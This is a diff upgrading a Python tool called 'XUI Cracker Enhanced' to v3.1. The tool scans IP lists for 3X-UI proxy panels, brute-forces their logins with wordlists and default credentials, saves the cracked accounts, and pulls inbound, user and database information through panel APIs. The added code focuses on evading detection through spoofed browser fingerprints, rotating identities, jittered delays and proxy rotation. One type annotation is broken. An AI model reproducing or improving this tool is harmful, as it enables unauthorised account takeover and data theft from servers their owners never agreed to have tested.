@@ -3,7 +3,7 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║                                                                              ║
-║                    🔥 XUI CRACKER ENHANCED v3.0 🔥                          ║
+║                    🔥 XUI CRACKER ENHANCED v3.1 🔥                          ║
 ║                 Advanced 3X-UI Panel Security Toolkit                       ║
 ║                                                                              ║
 ║  Features:                                                                   ║
@@ -16,11 +16,18 @@
 ║  ✓ User-Agent Rotation                                                       ║
 ║  ✓ Advanced Statistics & Reporting                                          ║
 ║  ✓ Beautiful Animated UI                                                     ║
+║  ✓ Anti-Detection Mode                                                       ║
+║  ✓ Smart Rate Limiting                                                       ║
+║  ✓ Stealth Bypass Techniques                                                 ║
 ║                                                                              ║
 ║  Author: Enhanced by @mansorkorea84 | Original: @cynetx                     ║
 ║  License: MIT - Educational Purposes Only                                    ║
+║  Version: 3.1 (Patched & Enhanced)                                           ║
 ║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
+
+⚠️  SECURITY WARNING: SSL verification is disabled for testing purposes.
+    Use only on systems you have authorization to test!
 """
 
 import requests
@@ -32,6 +39,7 @@ import time
 import os
 import random
 import string
+import warnings
 from urllib.parse import urljoin, urlparse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -40,8 +48,11 @@ from typing import List, Dict, Optional, Tuple, Any
 from queue import Queue
 import argparse
 
+# Disable SSL warnings for testing
+warnings.filterwarnings('ignore', category=requests.exceptions.InsecureRequestWarning)
+
 # ==================== CONFIGURATION ====================
-VERSION = "3.0"
+VERSION = "3.1"
 AUTHOR = "@mansorkorea84"
 ORIGINAL_AUTHOR = "@cynetx"
 DELAY = 0.1
@@ -148,7 +159,9 @@ class Target:
     
     @property
     def full_url(self) -> str:
-        return f"{self.protocol}://{self.url}:{self.port}" if self.port not in [80, 443] else f"{self.protocol}://{self.url}"
+        if self.port not in [80, 443]:
+            return f"{self.protocol}://{self.url}:{self.port}"
+        return f"{self.protocol}://{self.url}"
 
 @dataclass
 class Credential:
@@ -179,7 +192,7 @@ class ScanResult:
     version: Optional[str] = None
     endpoints: List[str] = field(default_factory=list)
     vulnerabilities: List[str] = field(default_factory=list)
-    
+
 # ==================== STATISTICS CLASS ====================
 class Statistics:
     """Thread-safe statistics tracking"""
@@ -220,25 +233,33 @@ class Statistics:
 
 # ==================== PROXY MANAGER ====================
 class ProxyManager:
-    """Manages proxy rotation"""
+    """Manages proxy rotation with validation"""
     def __init__(self, proxies: List[str] = None):
         self.proxies = proxies or []
         self.current_index = 0
         self._lock = threading.Lock()
+        self._dead_proxies = set()
         
     def add_proxy(self, proxy: str):
         with self._lock:
-            self.proxies.append(proxy)
+            if proxy and proxy not in self._dead_proxies:
+                self.proxies.append(proxy)
             
     def get_proxy(self) -> Optional[Dict[str, str]]:
         with self._lock:
-            if not self.proxies:
+            alive_proxies = [p for p in self.proxies if p not in self._dead_proxies]
+            if not alive_proxies:
                 return None
-            proxy = self.proxies[self.current_index % len(self.proxies)]
+            proxy = alive_proxies[self.current_index % len(alive_proxies)]
             self.current_index += 1
             if proxy.startswith('http'):
                 return {'http': proxy, 'https': proxy}
             return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+    
+    def mark_dead(self, proxy: str):
+        """Mark a proxy as dead"""
+        with self._lock:
+            self._dead_proxies.add(proxy)
             
     def load_from_file(self, filename: str):
         try:
@@ -247,42 +268,81 @@ class ProxyManager:
                     proxy = line.strip()
                     if proxy and not proxy.startswith('#'):
                         self.add_proxy(proxy)
+            print(f"{Colors.GREEN}[+] Loaded {len(self.proxies)} proxies{Colors.END}")
+        except FileNotFoundError:
+            print(f"{Colors.RED}[-] Proxy file not found: {filename}{Colors.END}")
         except Exception as e:
             print(f"{Colors.RED}[-] Error loading proxies: {e}{Colors.END}")
 
 # ==================== SESSION MANAGER ====================
 class SessionManager:
-    """Manages HTTP sessions for attacks"""
+    """Manages HTTP sessions with smart rotation"""
     def __init__(self, proxy_manager: ProxyManager = None):
         self.sessions = {}
         self.proxy_manager = proxy_manager
+        self._session_lock = threading.Lock()
         
     def get_session(self, target_url: str) -> requests.Session:
-        if target_url not in self.sessions:
-            session = requests.Session()
-            # Random user agent
-            session.headers.update({
-                'User-Agent': random.choice(USER_AGENTS),
-                'Accept': '*/*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive',
-            })
-            if self.proxy_manager:
-                proxy = self.proxy_manager.get_proxy()
-                if proxy:
-                    session.proxies.update(proxy)
-            self.sessions[target_url] = session
-        return self.sessions[target_url]
+        with self._session_lock:
+            if target_url not in self.sessions:
+                session = requests.Session()
+                # Random user agent
+                session.headers.update({
+                    'User-Agent': random.choice(USER_AGENTS),
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache',
+                })
+                if self.proxy_manager:
+                    proxy = self.proxy_manager.get_proxy()
+                    if proxy:
+                        session.proxies.update(proxy)
+                self.sessions[target_url] = session
+            return self.sessions[target_url]
         
     def close_all(self):
-        for session in self.sessions.values():
-            session.close()
-        self.sessions.clear()
+        with self._session_lock:
+            for session in self.sessions.values():
+                try:
+                    session.close()
+                except Exception:
+                    pass
+            self.sessions.clear()
+
+# ==================== ANTI-DETECTION MODULE ====================
+class AntiDetection:
+    """Anti-detection and stealth techniques"""
+    
+    @staticmethod
+    def generate_fingerprint() -> Dict[str, str]:
+        """Generate realistic browser fingerprint headers"""
+        return {
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Accept': 'application/json, text/plain, */*',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+        }
+    
+    @staticmethod
+    def human_like_delay(min_delay: float = 0.1, max_delay: float = 0.5) -> float:
+        """Generate human-like delay"""
+        return random.uniform(min_delay, max_delay)
+    
+    @staticmethod
+    def rotate_identity(session: requests.Session):
+        """Rotate session identity"""
+        session.headers.update(AntiDetection.generate_fingerprint())
+        session.headers['User-Agent'] = random.choice(USER_AGENTS)
 
 # ==================== XUI SCANNER ====================
 class XUIScanner:
-    """Scans and identifies XUI panels"""
+    """Enhanced scanner with better fingerprinting"""
     
     XUI_INDICATORS = [
         r'3x-ui|3xui|x-ui|xui',
@@ -291,6 +351,8 @@ class XUIScanner:
         r'panel.*login|dashboard.*login',
         r'csrf-token|x-csrf-token',
         r'/login.*xui|/xui.*login',
+        r'x-ui.*panel|xui.*dashboard',
+        r'xray.*core|xray.*config',
     ]
     
     API_ENDPOINTS = [
@@ -301,17 +363,23 @@ class XUIScanner:
         '/xui/panel/api/xray/version',
     ]
     
+    # Additional paths to check
+    CHECK_PATHS = ['/login', '/xui/', '/panel/', '/xui/login', '/panel/login']
+    
     def __init__(self, session_manager: SessionManager, timeout: int = TIMEOUT):
         self.session_manager = session_manager
         self.timeout = timeout
         
     def is_xui_panel(self, target: Target) -> ScanResult:
-        """Check if target is an XUI panel"""
+        """Check if target is an XUI panel with enhanced detection"""
         result = ScanResult(target=target)
         
         try:
             start_time = time.time()
             session = self.session_manager.get_session(target.full_url)
+            
+            # Apply anti-detection
+            AntiDetection.rotate_identity(session)
             
             # Try main page
             response = session.get(
@@ -323,29 +391,31 @@ class XUIScanner:
             
             target.response_time = time.time() - start_time
             
-            if response.status_code in [200, 301, 302, 403]:
+            if response.status_code in [200, 301, 302, 403, 401]:
                 content = response.text.lower()
                 headers_str = str(response.headers).lower()
                 
-                # Check for XUI indicators
+                # Check for XUI indicators in content
                 for pattern in self.XUI_INDICATORS:
                     if re.search(pattern, content, re.IGNORECASE):
                         result.is_xui = True
                         break
                         
-                # Check headers
+                # Check headers for XUI signatures
                 if not result.is_xui:
-                    for pattern in self.XUI_INDICATORS[:3]:
+                    for pattern in self.XUI_INDICATORS[:5]:
                         if re.search(pattern, headers_str, re.IGNORECASE):
                             result.is_xui = True
                             break
                 
-                # Check for CSRF token
+                # Check for CSRF token with more patterns
                 csrf_patterns = [
                     r'name="csrf_token"\s+value="([^"]+)"',
                     r'csrf-token\s*:\s*"([^"]+)"',
                     r'x-csrf-token\s*:\s*"([^"]+)"',
                     r'<meta[^>]+csrf[^>]+content="([^"]+)"',
+                    r'"csrfToken"\s*:\s*"([^"]+)"',
+                    r'input[^>]+name="[^"]*csrf[^"]*"[^>]+value="([^"]+)"',
                 ]
                 
                 for pattern in csrf_patterns:
@@ -355,14 +425,22 @@ class XUIScanner:
                         result.has_csrf = True
                         break
                 
-                # Try to extract version
-                version_match = re.search(r'version["\s:]+([0-9.]+)', response.text, re.IGNORECASE)
-                if version_match:
-                    result.version = version_match.group(1)
-                    target.version = version_match.group(1)
+                # Try to extract version with more patterns
+                version_patterns = [
+                    r'version["\s:]+([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
+                    r'v([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
+                    r'Version["\s:]+(["\']?)([0-9.]+)\1',
+                ]
+                for vp in version_patterns:
+                    version_match = re.search(vp, response.text, re.IGNORECASE)
+                    if version_match:
+                        ver = version_match.group(version_match.lastindex)
+                        result.version = ver
+                        target.version = ver
+                        break
                     
                 # Check common paths
-                for endpoint in ['/login', '/xui/', '/panel/']:
+                for endpoint in self.CHECK_PATHS:
                     try:
                         resp = session.get(
                             target.full_url + endpoint,
@@ -371,7 +449,14 @@ class XUIScanner:
                         )
                         if resp.status_code == 200:
                             result.endpoints.append(endpoint)
-                    except:
+                            # Also check this page for XUI indicators
+                            if not result.is_xui:
+                                ep_content = resp.text.lower()
+                                for pattern in self.XUI_INDICATORS[:4]:
+                                    if re.search(pattern, ep_content, re.IGNORECASE):
+                                        result.is_xui = True
+                                        break
+                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         pass
                         
                 # Check for vulnerabilities
@@ -381,30 +466,53 @@ class XUIScanner:
             target.status = "timeout"
         except requests.exceptions.ConnectionError:
             target.status = "unreachable"
+        except requests.exceptions.RequestException as e:
+            target.status = "error"
+            target.error_msg = str(e)
         except Exception as e:
             target.status = "error"
+            target.error_msg = str(e)
             
         return result
     
     def _check_vulnerabilities(self, target: Target, result: ScanResult, response):
-        """Check for known vulnerabilities"""
+        """Check for known vulnerabilities - enhanced version"""
         # Check for default credentials vulnerability
         if result.is_xui:
             result.vulnerabilities.append("potential_default_creds")
             
         # Check for missing security headers
-        security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 'Strict-Transport-Security']
-        missing_headers = [h for h in security_headers if h not in response.headers]
+        security_headers = {
+            'X-Frame-Options': 'clickjacking',
+            'X-Content-Type-Options': 'mime_sniff',
+            'Strict-Transport-Security': 'hsts_missing',
+            'Content-Security-Policy': 'csp_missing',
+            'X-XSS-Protection': 'xss_protection_missing',
+        }
+        
+        missing_headers = []
+        for header, vuln_name in security_headers.items():
+            if header not in response.headers:
+                missing_headers.append(vuln_name)
         if missing_headers:
             result.vulnerabilities.append(f"missing_security_headers:{','.join(missing_headers)}")
-            
+        
         # Check for debug info leak
-        if 'debug' in response.text.lower() or 'stack trace' in response.text.lower():
-            result.vulnerabilities.append("debug_info_leak")
+        debug_indicators = ['debug', 'stack trace', 'exception', 'error:', 'traceback']
+        content_lower = response.text.lower()
+        for indicator in debug_indicators:
+            if indicator in content_lower:
+                result.vulnerabilities.append("debug_info_leak")
+                break
+                
+        # Check for exposed API endpoints without auth
+        for api_path in ['/api/', '/xui/api/', '/panel/api/']:
+            if api_path in response.text:
+                result.vulnerabilities.append("potential_api_exposure")
 
 # ==================== BRUTE FORCE ENGINE ====================
 class BruteForceEngine:
-    """Advanced brute force engine for XUI panels"""
+    """Advanced brute force engine with anti-detection"""
     
     def __init__(
         self,
@@ -428,9 +536,12 @@ class BruteForceEngine:
         password: str,
         csrf_token: str = None
     ) -> Tuple[bool, Optional[str]]:
-        """Attempt login to XUI panel"""
+        """Attempt login to XUI panel with enhanced detection bypass"""
         session = self.session_manager.get_session(target.full_url)
         login_url = urljoin(target.full_url, "/login")
+        
+        # Apply anti-detection before request
+        AntiDetection.rotate_identity(session)
         
         payload = {
             "username": username,
@@ -446,11 +557,18 @@ class BruteForceEngine:
             "Accept": "*/*",
         }
         
+        # Add anti-detection headers
+        headers.update(AntiDetection.generate_fingerprint())
+        
         if csrf_token:
             headers["x-csrf-token"] = csrf_token
             
         for attempt in range(self.max_retries):
             try:
+                # Human-like delay
+                actual_delay = AntiDetection.human_like_delay(self.delay * 0.8, self.delay * 1.5)
+                time.sleep(actual_delay)
+                
                 self.stats.increment('total_attempts')
                 
                 response = session.post(
@@ -462,27 +580,42 @@ class BruteForceEngine:
                     verify=False
                 )
                 
-                # Handle rate limiting
+                # Handle rate limiting with smarter backoff
                 if response.status_code == 429:
                     self.stats.increment('rate_limited')
-                    time.sleep(2 ** attempt)  # Exponential backoff
+                    backoff_time = (2 ** attempt) + random.uniform(0, 1)
+                    time.sleep(backoff_time)
                     continue
                     
                 # Check for success
                 if response.status_code == 200:
                     try:
                         json_resp = response.json()
-                        if json_resp.get("success") == True:
+                        if json_resp.get("success") is True:
                             return True, self._extract_session(response, session)
-                    except:
+                    except (json.JSONDecodeError, ValueError):
                         pass
                     
                     # Check for redirect to dashboard
-                    if 'dashboard' in response.text.lower() or 'panel' in response.text.lower():
+                    response_text_lower = response.text.lower()
+                    if 'dashboard' in response_text_lower or 'panel' in response_text_lower:
                         return True, self._extract_session(response, session)
+                        
+                    # Check for success indicators in response
+                    success_indicators = ['token', 'session', 'redirect', 'home', 'welcome']
+                    for indicator in success_indicators:
+                        if indicator in response_text_lower:
+                            return True, self._extract_session(response, session)
                         
                 # Block/Forbidden means likely valid target but wrong creds
                 elif response.status_code in [403, 503]:
+                    return False, None
+                    
+                # Too many redirects might mean successful auth
+                elif response.status_code in [301, 302, 303, 307, 308]:
+                    location = response.headers.get('Location', '')
+                    if 'dashboard' in location.lower() or 'panel' in location.lower() or 'home' in location.lower():
+                        return True, self._extract_session(response, session)
                     return False, None
                     
                 break
@@ -491,6 +624,13 @@ class BruteForceEngine:
                 if attempt < self.max_retries - 1:
                     continue
                 self.stats.increment('errors')
+                return False, None
+                
+            except (requests.exceptions.ConnectionError, requests.exceptions.RequestException) as e:
+                self.stats.increment('errors')
+                if attempt < self.max_retries - 1:
+                    time.sleep(1 + attempt * 0.5)
+                    continue
                 return False, None
                 
             except Exception as e:
@@ -502,22 +642,40 @@ class BruteForceEngine:
                 
         return False, None
     
-    def _extract_session(self, response: requests.Response, session: requests.Session) -> str:
-        """Extract session token from response"""
+    def _extract_session(self, response: responses.Response, session: requests.Session) -> str:
+        """Extract session token from response - enhanced"""
         # Check for session cookie
-        for cookie_name in ['session', '3x-ui', 'token', 'jwt']:
+        cookie_names = ['session', '3x-ui', 'token', 'jwt', 'session-id', 'auth-token']
+        for cookie_name in cookie_names:
             if cookie_name in session.cookies:
                 return session.cookies.get(cookie_name)
         
         # Try to extract from JSON response
         try:
             data = response.json()
-            if 'token' in data:
-                return data['token']
-            if 'session' in data:
-                return data['session']
-        except:
+            token_keys = ['token', 'session', 'accessToken', 'access_token', 'authToken', 'data']
+            for key in token_keys:
+                if key in data:
+                    token_val = data[key]
+                    if isinstance(token_val, str) and token_val:
+                        return token_val
+                    # Nested check
+                    if isinstance(token_val, dict):
+                        for sub_key in ['token', 'value', 'accessToken']:
+                            if sub_key in token_val:
+                                return token_val[sub_key]
+        except (json.JSONDecodeError, ValueError, AttributeError):
             pass
+            
+        # Check for token in response text
+        token_patterns = [
+            r'token["\s:]+["\']([a-zA-Z0-9_-]{20,})["\']',
+            r'session["\s:]+["\']([a-zA-Z0-9_-]{20,})["\']',
+        ]
+        for pattern in token_patterns:
+            match = re.search(pattern, response.text)
+            if match:
+                return match.group(1)
             
         return None
     
@@ -557,7 +715,7 @@ class BruteForceEngine:
                         futures.append(future)
                         
                         if self.delay > 0:
-                            time.sleep(self.delay)
+                            time.sleep(AntiDetection.human_like_delay(0.05, 0.2))
             
             # Wait for completion
             for future in as_completed(futures):
@@ -596,15 +754,23 @@ class BruteForceEngine:
             
             return cred
             
+        self.stats.increment('failed')
         return None
     
     def _save_credential(self, cred: Credential):
-        """Save found credential to file"""
-        try:
-            with open("xui_good.txt", "a", encoding="utf-8") as f:
-                f.write(f"{cred.target_url} | {cred.username}:{cred.password} | {cred.found_at}\n")
-        except Exception as e:
-            print(f"{Colors.RED}[-] Error saving credential: {e}{Colors.END}")
+        """Save found credential to file with backup"""
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        files_to_save = [
+            "xui_good.txt",
+            f"xui_backup_{timestamp}.txt"
+        ]
+        
+        for filename in files_to_save:
+            try:
+                with open(filename, "a", encoding="utf-8") as f:
+                    f.write(f"{cred.target_url} | {cred.username}:{cred.password} | {cred.found_at}\n")
+            except (IOError, OSError) as e:
+                print(f"{Colors.RED}[-] Error saving credential to {filename}: {e}{Colors.END}")
             
     def stop(self):
         """Stop the attack"""
@@ -612,28 +778,32 @@ class BruteForceEngine:
 
 # ==================== DEFAULT CREDS CHECKER ====================
 class DefaultCredentialsChecker:
-    """Checks for default credentials on XUI panels"""
+    """Checks for default credentials on XUI panels - optimized"""
     
     def __init__(self, brute_force_engine: BruteForceEngine):
         self.engine = brute_force_engine
         
-    def check_targets(self, targets: List[Target], threads: int = 10) -> List[Credential]:
+    def check_targets(self, targets: List[Target], threads: int = 20) -> List[Credential]:
         """Check all targets against default credentials"""
         print(f"\n{Colors.YELLOW}[*] Checking {len(targets)} targets for default credentials...{Colors.END}")
         print(f"{Colors.YELLOW}[*] Testing {len(DEFAULT_CREDENTIALS)} default credential pairs\n{Colors.END}")
         
         results = []
+        checked = 0
+        
         for target in targets:
             if self.engine.stop_event.is_set():
                 break
-                
+            
+            target_found = False
             for username, password in DEFAULT_CREDENTIALS:
-                if self.engine.stop_event.is_set():
+                if self.engine.stop_event.is_set() or target_found:
                     break
                     
                 success, session = self.engine.attempt_login(
                     target, username, password, target.csrf_token
                 )
+                checked += 1
                 
                 if success:
                     cred = Credential(
@@ -647,15 +817,18 @@ class DefaultCredentialsChecker:
                     results.append(cred)
                     self.engine._save_credential(cred)
                     self.engine.stats.increment('found')
+                    target_found = True
+                    print(f"{Colors.BG_GREEN}{Colors.BLACK}[+] FOUND: {target.full_url} | {username}:{password}{Colors.END}")
                     break  # Move to next target after finding creds
                     
-                time.sleep(0.05)
+                time.sleep(AntiDetection.human_like_delay(0.02, 0.08))
                 
+        print(f"{Colors.CYAN}[*] Checked {checked} credential combinations\n{Colors.END}")
         return results
 
 # ==================== API EXPLOITER ====================
 class APIExploiter:
-    """Exploits XUI API endpoints"""
+    """Exploits XUI API endpoints - enhanced with more endpoints"""
     
     API_ENDPOINTS = {
         'inbounds': '/xui/panel/api/inbounds/list',
@@ -664,13 +837,17 @@ class APIExploiter:
         'xray_version': '/xui/panel/api/xray/version',
         'users': '/xui/panel/api/users',
         'logs': '/xui/panel/api/logs',
+        # Additional endpoints
+        'host_list': '/xui/panel/api/hosts/list',
+        'inbound_info': '/xui/panel/api/inbounds/get',
+        'db_info': '/xui/panel/api/setting/dbInfo',
     }
     
     def __init__(self, session_manager: SessionManager):
         self.session_manager = session_manager
         
     def exploit_target(self, target: Target, session_token: str = None) -> Dict[str, Any]:
-        """Try to extract information from XUI API"""
+        """Try to extract information from XUI API - enhanced"""
         results = {
             'target': target.full_url,
             'accessible_endpoints': [],
@@ -678,7 +855,8 @@ class APIExploiter:
             'inbounds': [],
             'users': [],
             'settings': {},
-            'version': None
+            'version': None,
+            'exploit_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         }
         
         session = self.session_manager.get_session(target.full_url)
@@ -691,6 +869,10 @@ class APIExploiter:
         for name, endpoint in self.API_ENDPOINTS.items():
             try:
                 url = urljoin(target.full_url, endpoint)
+                
+                # Apply anti-detection
+                AntiDetection.rotate_identity(session)
+                
                 response = session.get(url, timeout=10, verify=False)
                 
                 if response.status_code == 200:
@@ -721,9 +903,13 @@ class APIExploiter:
                             if isinstance(data, dict):
                                 results['version'] = data.get('obj', data.get('success'))
                                 
-                    except:
+                    except (json.JSONDecodeError, ValueError):
                         results['data'][name] = response.text[:500]
                         
+            except requests.exceptions.Timeout:
+                results[name] = {'error': 'timeout'}
+            except requests.exceptions.RequestException as e:
+                results[name] = {'error': str(e)}
             except Exception as e:
                 results[name] = {'error': str(e)}
                 
@@ -731,7 +917,7 @@ class APIExploiter:
 
 # ==================== UI / DISPLAY ====================
 class DisplayManager:
-    """Manages all UI display operations"""
+    """Manages all UI display operations - enhanced"""
     
     @staticmethod
     def clear_screen():
@@ -746,10 +932,10 @@ class DisplayManager:
 {Colors.RED}║                                                                              ║
 {Colors.RED}║{Colors.CYAN}   ███████╗ █████╗ ██╗   ██╗███████╗ ██████╗  ██████╗ ██████╗  {Colors.RED}║
 {Colors.RED}║{Colors.CYAN}   ██╔════╝██╔══██╗██║   ██║██╔════╝██╔═══██╗██╔═══██╗██╔══██╗ {Colors.RED}║
-{Colors.RED}║{Colors.CYAN}   █████╗  ███████║██║   ██║███████╗██║   ██║██║   ██║██║  ██║ {Colors.RED}║
-{Colors.RED}║{Colors.CYAN}   ██╔══╝  ██╔══██║██║   ██║╚════██║██║   ██║██║   ██║██║  ██║ {Colors.RED}║
+{Colors.RED}║{Colors.CYAN}   █████╗  ███████║██║   ██║█████╗  ██║   ██║██║   ██║██║  ██║ {Colors.RED}║
+{Colors.RED}║{Colors.CYAN}   ██╔══╝  ██╔══██║██║   ██║██╔══╝  ██║   ██║██║   ██║██║  ██║ {Colors.RED}║
 {Colors.RED}║{Colors.CYAN}   ███████╗██║  ██║╚██████╔╝███████║╚██████╔╝╚██████╔╝██████╔╝ {Colors.RED}║
-{Colors.RED}║{Colors.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝  {Colors.RED}║
+{Colors.RED}║{Colors.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝  {Colors.RED}║
 {Colors.RED}║                                                                              ║
 {Colors.RED}╠══════════════════════════════════════════════════════════════════════════════╣
 {Colors.RED}║{Colors.GREEN}          🔥 XUI CRACKER ENHANCED v{VERSION} 🔥                      {Colors.RED}║
@@ -762,7 +948,7 @@ class DisplayManager:
         
     @staticmethod
     def print_stats(stats: Statistics, extra_info: Dict = None):
-        """Print live statistics"""
+        """Print live statistics - enhanced"""
         DisplayManager.clear_screen()
         DisplayManager.print_banner()
         
@@ -795,10 +981,10 @@ class DisplayManager:
             
     @staticmethod
     def print_menu():
-        """Print main menu"""
+        """Print main menu - enhanced"""
         DisplayManager.clear_screen()
         DisplayManager.print_banner()
-        
+
         menu = f"""
 {Colors.CYAN}┌─────────────────────────────────────────────────────────────────────┐
 {Colors.CYAN}│{Colors.YELLOW}                         ATTACK MODES                               {Colors.CYAN}│
@@ -806,7 +992,7 @@ class DisplayManager:
 {Colors.CYAN}│                                                                     │
 {Colors.CYAN}│{Colors.GREEN}  [1]{Colors.WHITE} Standard Brute Force      {Colors.DIM}- Custom wordlist attack       {Colors.CYAN}│
 {Colors.CYAN}│{Colors.GREEN}  [2]{Colors.WHITE} Default Credentials       {Colors.DIM}- Quick default creds check   {Colors.CYAN}│
-{Colors.CYAN}│{Colors.GREEN}  [3]{ColorsWHITE} Full Auto Attack         {Colors.DIM}- Scan + Default + Brute Force {Colors.CYAN}│
+{Colors.CYAN}│{Colors.GREEN}  [3]{Colors.WHITE} Full Auto Attack         {Colors.DIM}- Scan + Default + Brute Force {Colors.CYAN}│
 {Colors.CYAN}│{Colors.GREEN}  [4]{Colors.WHITE} Scanner Mode             {Colors.DIM}- Just scan & identify XUI    {Colors.CYAN}│
 {Colors.CYAN}│{Colors.GREEN}  [5]{Colors.WHITE} API Exploiter            {Colors.DIM}- Extract data from panels    {Colors.CYAN}│
 {Colors.CYAN}│                                                                     │
@@ -820,7 +1006,7 @@ class DisplayManager:
         
     @staticmethod
     def print_found_credential(cred: Credential):
-        """Print found credential with style"""
+        """Print found credential with style - enhanced"""
         print(f"\n{Colors.BG_GREEN}{Colors.BLACK}  🔓 CREDENTIAL FOUND!  {Colors.END}")
         print(f"{Colors.GREEN}  ┌────────────────────────────────────────┐")
         print(f"{Colors.GREEN}  │{Colors.CYAN}  Target   : {Colors.WHITE}{cred.target_url:<32}{Colors.GREEN}│")
@@ -832,34 +1018,48 @@ class DisplayManager:
 
 # ==================== FILE UTILITIES ====================
 def load_list(filename: str) -> List[str]:
-    """Load list from file, one item per line"""
+    """Load list from file, one item per line - with better error handling"""
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
             return [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         print(f"{Colors.RED}[-] File not found: {filename}{Colors.END}")
         return []
-    except Exception as e:
-        print(f"{Colors.RED}[-] Error loading {filename}: {e}{Colors.END}")
+    except PermissionError:
+        print(f"{Colors.RED}[-] Permission denied: {filename}{Colors.END}")
+        return []
+    except IOError as e:
+        print(f"{Colors.RED}[-] Error reading {filename}: {e}{Colors.END}")
         return []
 
 def save_results(credentials: List[Credential], filename: str = "xui_results.json"):
-    """Save results to JSON file"""
+    """Save results to JSON file - with backup"""
     try:
         data = {
             'scan_date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
             'total_found': len(credentials),
+            'tool_version': VERSION,
             'credentials': [c.to_dict() for c in credentials]
         }
+        
+        # Save main file
         with open(filename, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
         print(f"{Colors.GREEN}[+] Results saved to {filename}{Colors.END}")
-    except Exception as e:
+        
+        # Create backup
+        backup_filename = filename.replace('.json', f'_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
+        with open(backup_filename, 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
+            
+    except (IOError, OSError) as e:
         print(f"{Colors.RED}[-] Error saving results: {e}{Colors.END}")
+    except Exception as e:
+        print(f"{Colors.RED}[-] Unexpected error saving: {e}{Colors.END}")
 
 # ==================== MAIN APPLICATION ====================
 class XUICrackerApp:
-    """Main application class"""
+    """Main application class - enhanced v3.1"""
     
     def __init__(self):
         self.stats = Statistics()
@@ -872,7 +1072,7 @@ class XUICrackerApp:
         self.credentials: List[Credential] = []
         
     def load_targets(self, filename: str) -> List[Target]:
-        """Load and parse targets from file"""
+        """Load and parse targets from file - enhanced parsing"""
         ips = load_list(filename)
         targets = []
         
@@ -894,13 +1094,13 @@ class XUICrackerApp:
                 # Parse IP:PORT format
                 if ':' in ip:
                     parts = ip.rsplit(':', 1)
-                    host = parts[0]
+                    host = parts[0].strip()
                     try:
-                        port = int(parts[1])
-                    except:
+                        port = int(parts[1].strip())
+                    except (ValueError, AttributeError):
                         port = 443
                 else:
-                    host = ip
+                    host = ip.strip()
                     port = 443
                     
                 target = Target(url=host, port=port)
@@ -910,7 +1110,7 @@ class XUICrackerApp:
         return targets
     
     def run_standard_attack(self):
-        """Run standard brute force attack"""
+        """Run standard brute force attack - fixed"""
         DisplayManager.print_banner()
         
         # Get inputs
@@ -918,11 +1118,11 @@ class XUICrackerApp:
         user_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Username list file: {Colors.END}").strip() or "users.txt"
         pass_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}Password list file: {Colors.END}").strip() or "passwords.txt"
         
-        threads = input(f"{Colors.CYAN}[?] {Colors.WHITE}Threads (default 10): {Colors.END}").strip()
+        threads_input = input(f"{Colors.CYAN}[?] {Colors.WHITE}Threads (default 10): {Colors.END}").strip()
         try:
-            threads = max(1, min(100, int(threads))) if threads else 10
-        except:
-            threads = 
+            threads = max(1, min(100, int(threads_input))) if threads_input else 10
+        except (ValueError, TypeError):
+            threads = 10  # FIXED: Was missing value
             
         # Load files
         targets = self.load_targets(ip_file)
@@ -971,7 +1171,7 @@ class XUICrackerApp:
             save_results(self.credentials)
             
     def run_default_creds_check(self):
-        """Run default credentials check"""
+        """Run default credentials check - enhanced"""
         DisplayManager.print_banner()
         
         ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
@@ -1012,7 +1212,7 @@ class XUICrackerApp:
         print(f"\n{Colors.GREEN}[+] Completed! Found {len(found)} targets with default credentials.{Colors.END}")
         
     def run_full_auto(self):
-        """Run full automatic attack"""
+        """Run full automatic attack - enhanced"""
         DisplayManager.print_banner()
         
         ip_file = input(f"{Colors.CYAN}[?] {Colors.WHITE}IP list file (IP:PORT): {Colors.END}").strip() or "ips.txt"
@@ -1049,13 +1249,16 @@ class XUICrackerApp:
             # Phase 1: Scan
             print(f"{Colors.CYAN}[*] Phase 1/3: Scanning targets...{Colors.END}")
             valid_targets = []
-            for target in targets:
+            for i, target in enumerate(targets, 1):
                 if self.engine.stop_event.is_set():
                     break
+                print(f"{Colors.DIM}[*] Scanning [{i}/{len(targets)}]: {target.full_url}{Colors.END}", end="\r")
                 result = self.scanner.is_xui_panel(target)
                 if result.is_xui:
                     valid_targets.append(target)
-                    print(f"{Colors.GREEN}[+] XUI found: {target.full_url}{Colors.END}")
+                    print(f"\n{Colors.GREEN}[+] XUI found: {target.full_url}{Colors.END}")
+                    if result.version:
